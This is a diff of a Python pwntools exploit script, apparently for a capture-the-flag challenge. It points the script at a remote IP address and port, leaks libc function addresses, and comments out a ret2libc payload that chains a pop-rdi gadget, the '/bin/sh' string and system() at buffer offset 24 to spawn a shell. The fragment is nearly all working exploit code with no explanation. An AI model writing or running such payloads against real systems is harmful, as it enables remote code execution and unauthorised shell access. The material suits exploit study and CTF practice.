@@ -16,7 +16,7 @@ break * 0x000000000040115a
 c
 '''.format(**locals())
 
-io = start()
+io = remote('3.85.17.84', 1278)
 
 poprdi = 0x000000000040115a
 putsplt = 0x401030
@@ -54,23 +54,23 @@ print("puts", hex(puts_add))
 print("printf", hex(printf_add))
 print("fgets", hex(fgets_add))
 
-puts_base_add = 0x77980
-base_add = puts_add - puts_base_add
+# puts_base_add = 0x77980
+# base_add = puts_add - puts_base_add
 
-system = 0x4c490 + base_add
-str_bin_sh = 0x197031 + base_add
+# system = 0x4c490 + base_add
+# str_bin_sh = 0x197031 + base_add
 
-payload = flat({
-    24: [
-        poprdi, str_bin_sh,
-        retgadget,
-        system
-    ]
-})
+# payload = flat({
+#     24: [
+#         poprdi, str_bin_sh,
+#         retgadget,
+#         system
+#     ]
+# })
 
-print("system", hex(system))
-print("str_bin_sh", hex(str_bin_sh))
+# print("system", hex(system))
+# print("str_bin_sh", hex(str_bin_sh))
 
-io.sendline(payload)
+# io.sendline(payload)
 
 io.interactive()
